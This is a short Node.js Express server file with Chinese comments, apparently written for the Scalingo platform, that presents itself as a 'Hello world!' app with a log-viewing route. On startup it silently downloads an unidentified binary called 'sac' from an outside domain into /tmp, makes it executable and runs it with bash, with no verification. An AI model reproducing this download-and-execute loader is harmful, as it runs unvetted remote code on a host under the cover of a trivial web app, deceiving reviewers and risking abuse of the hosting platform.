const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');

const PORT = process.env.PORT || 3000;  // Scalingo 自动设置 PORT
const FILE_PATH = '/tmp';                // Scalingo 可写目录

// 确保 log.txt 存在
const logPath = path.join(FILE_PATH, 'log.txt');
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, "");
}

// 根路由
app.get("/", (req, res) => {
  res.send("Hello world!");
});

// log 路由
app.get("/log", (req, res) => {
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error("读取 log.txt 出错:", err);
      return res.status(500).send("读取 log.txt 出错");
    }
    res.type("text/plain").send(data);
  });
});

// 下载 sac 文件到 /tmp
const downloadSac = async () => {
  try {
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const sacPath = path.join(FILE_PATH, 'sac');
    const writer = fs.createWriteStream(sacPath);
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        exec(`chmod +x ${sacPath}`, (err) => {
          if (err) reject(err);
          else resolve(sacPath);
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    console.error("下载 sac 出错:", err);
  }
};

// 执行 sac
const executeSac = async () => {
  try {
    const sacPath = await downloadSac();
    if (sacPath) {
      exec(sacPath, { shell: '/bin/bash' }, (err, stdout, stderr) => {
        if (err) console.error("执行 sac 出错:", err);
        if (stdout) console.log("sac 输出:", stdout);
        if (stderr) console.error("sac 错误输出:", stderr);
      });
    }
  } catch (err) {
    console.error("Execute 出错:", err);
  }
};

// 启动 sac 执行
executeSac();

// 启动 Express 服务
app.listen(PORT, () => {
  console.log(`Server is running on port: ${PORT}`);
});
